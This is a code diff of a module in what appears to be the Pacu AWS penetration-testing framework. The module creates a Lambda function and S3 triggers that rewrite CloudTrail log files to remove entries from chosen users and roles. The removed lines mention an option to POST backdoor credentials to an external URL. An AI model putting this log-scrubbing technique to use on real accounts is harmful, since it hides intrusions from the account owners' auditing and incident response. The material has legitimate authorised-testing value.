@@ -17,7 +17,7 @@ module_info = {
 
     'one_liner': 'Creates a Lambda function and S3 event trigger to scrub CloudTrail logs of our own logs.',
 
-    'description': 'This module creates a new Lambda function and an accompanying S3 event trigger that will trigger upon a new file being put into a bucket you specify. The Lambda function will determine if the file that was placed in the bucket is a CloudTrail log file, and if it is, it will download it, then remove any "AccessDenied" logs related to the Lambda function and any logs coming from the user/role name you specify. It will then re-upload that file ontop of the old one. Note: An IAM role that has the S3 ReadObject and S3 PutObject permissions is required to be attached to the Lambda function when it is created.',
+    'description': 'This module creates a new Lambda function and an accompanying S3 event trigger that will trigger upon a new file being put into any buckets you specify. The Lambda function will determine if the file that was placed in the bucket is a CloudTrail log file, and if it is, it will download it, then remove any "AccessDenied" logs related to the Lambda function and any logs coming from the user/role name you specify. It will then re-upload that file ontop of the old one. Note: An IAM role that has the S3 GetObject and S3 PutObject permissions is required to be attached to the Lambda function when it is created.',
 
     'services': ['Lambda', 'S3', 'IAM'],
 
@@ -25,13 +25,16 @@ module_info = {
 
     'external_dependencies': [],
 
-    'arguments_to_autocomplete': ['--exfil-url', '--cleanup'],
+    'arguments_to_autocomplete': ['--role-arn', '--buckets', '--user-names', '--role-names', '--cleanup'],
 }
 
 parser = argparse.ArgumentParser(add_help=False, description=module_info['description'])
 
-parser.add_argument('--exfil-url', required=False, default=None, help='The URL to POST backdoor credentials to, so you can access them.')
-parser.add_argument('--cleanup', required=False, default=False, action='store_true', help='Run the module in cleanup mode. This will remove any known backdoors that the module added from the account.')
+parser.add_argument('--role-arn', required=False, default=None, help='The ARN of the role to attach to the Lambda function that gets created. Must have S3 GetObject and S3 PutObject permissions.')
+parser.add_argument('--buckets', required=True, help='The S3 bucket(s) to target. An event trigger will be added to each bucket and for every item that is put into that bucket, our Lambda function will be invoked. These buckets should be where CloudTrail trails are saving their logs in the account.')
+parser.add_argument('--user-names', required=False, default=None, help='The user names of any users that you want to remove logs for. The Lambda function will delete any logs from the CloudTrail output that originate from these users. One of either this argument or --role-name is required.')
+parser.add_argument('--role-names', required=False, default=None, help='The role names of any roles that you want to remove logs for. The Lambda function will delete any logs from the CloudTrail output that originate from these roles. One of either this argument or --user-name is required.')
+parser.add_argument('--cleanup', required=False, default=False, action='store_true', help='Run the module in cleanup mode. This will remove any known CloudTrail interceptors that the module added from the account.')
 
 
 def main(args, pacu_main):
@@ -46,14 +49,14 @@ def main(args, pacu_main):
 
     if args.cleanup:
         created_lambda_functions = []
-        created_cwe_rules = []
+        created_s3_triggers = []
 
         if os.path.isfile('./modules/{}/created-lambda-functions.txt'.format(module_info['name'])):
             with open('./modules/{}/created-lambda-functions.txt'.format(module_info['name']), 'r') as f:
                 created_lambda_functions = f.readlines()
-        if os.path.isfile('./modules/{}/created-cloudwatch-events-rules.txt'.format(module_info['name'])):
-            with open('./modules/{}/created-cloudwatch-events-rules.txt'.format(module_info['name']), 'r') as f:
-                created_cwe_rules = f.readlines()
+        if os.path.isfile('./modules/{}/created-s3-event-triggers.txt'.format(module_info['name'])):
+            with open('./modules/{}/created-s3-event-triggers.txt'.format(module_info['name']), 'r') as f:
+                created_s3_triggers = f.readlines()
 
         if created_lambda_functions:
             delete_function_file = True
@@ -79,11 +82,11 @@ def main(args, pacu_main):
                 except Exception as error:
                     print('  Failed to remove ./modules/{}/created-lambda-functions.txt'.format(module_info['name']))
 
-        if created_cwe_rules:
-            delete_cwe_file = True
-            for rule in created_cwe_rules:
-                name = rule.rstrip()
-                print('  Deleting rule {}...'.format(name))
+        if created_s3_triggers:
+            delete_s3_file = True
+            for trigger in created_s3_triggers:
+                name = trigger.rstrip()
+                print('  Deleting S3 trigger {}...'.format(name))
                 client = pacu_main.get_boto3_client('events', 'us-east-1')
                 try:
                     client.remove_targets(
@@ -99,13 +102,13 @@ def main(args, pacu_main):
                         print('  FAILURE: MISSING NEEDED PERMISSIONS')
                     else:
                         print(code)
-                    delete_cwe_file = False
+                    delete_s3_file = False
                     break
-            if delete_cwe_file:
+            if delete_s3_file:
                 try:
-                    os.remove('./modules/{}/created-cloudwatch-events-rules.txt'.format(module_info['name']))
+                    os.remove('./modules/{}/created-s3-event-triggers.txt'.format(module_info['name']))
                 except Exception as error:
-                    print('  Failed to remove ./modules/{}/created-lambda-functions.txt'.format(module_info['name']))
+                    print('  Failed to remove ./modules/{}/created-s3-event-triggers.txt'.format(module_info['name']))
 
         print('Completed cleanup mode.\n')
         return {'cleanup': True}
